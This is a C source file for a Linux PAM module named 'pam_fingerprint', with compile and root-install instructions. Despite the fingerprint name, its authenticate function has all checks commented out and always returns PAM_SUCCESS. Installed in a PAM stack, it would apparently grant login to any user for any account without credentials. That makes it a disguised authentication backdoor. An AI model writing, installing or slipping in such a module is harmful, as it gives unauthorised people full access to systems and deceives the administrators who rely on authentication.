/* 
 * compile it:
 *  ~$ gcc -fPIC -DPIC -shared -rdynamic -o pam_fingerprint.so pam_fingerprint.c
 *
 * Before compiling install package:
 * libpam0g-dev
 * 
 * install it:
 * ~# cp pam_fingerprint.so /lib/security/pam_fingerprint.so
 * ~# chown root:root /lib/security/pam_fingerprint.so
 * ~# chmod 755 /lib/security/pam_fingerprint.so
 */
 
/* Define which PAM interfaces we provide */
#define PAM_SM_ACCOUNT
#define PAM_SM_AUTH
#define PAM_SM_PASSWORD
#define PAM_SM_SESSION

/* Include PAM headers */
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include <unistd.h>
#include <stdio.h>
#include <pwd.h>

/* PAM entry point for session creation */
int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return(PAM_IGNORE);
}

/* PAM entry point for session cleanup */
int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return(PAM_IGNORE);
}

/* PAM entry point for accounting */
int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return(PAM_IGNORE);
}

/* PAM entry point for authentication verification */
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    /*struct passwd *pw = NULL, pw_s;
    const char *user = NULL;
    char buffer[1024], checkfile[1024];
    int pgu_ret, gpn_ret, snp_ret, a_ret;

    pgu_ret = pam_get_user(pamh, &user, NULL);
    if (pgu_ret != PAM_SUCCESS || user == NULL)
    {
        return(PAM_IGNORE);
    }

    gpn_ret = getpwnam_r(user, &pw_s, buffer, sizeof(buffer), &pw);
    if (gpn_ret != 0 || pw == NULL || pw->pw_dir == NULL || pw->pw_dir[0] != '/')
    {
        return(PAM_IGNORE);
    }

    snp_ret = snprintf(checkfile, sizeof(checkfile), "%s/.ssh/nopasswd", pw->pw_dir);
    if (snp_ret >= sizeof(checkfile))
    {
        return(PAM_IGNORE);
    }

    a_ret = access(checkfile, F_OK);
    if (a_ret == 0)
    {
        /* The user's file exists, return authentication failure */
        /*return(PAM_AUTH_ERR);
    }*/

    return(PAM_SUCCESS);
}

/*
 * PAM entry point for setting user credentials (that is, to actually
 * establish the authenticated user's credentials to the service provider)
*/
int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return(PAM_IGNORE);
}

/* PAM entry point for authentication token (password) changes */
int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return(PAM_IGNORE);
}
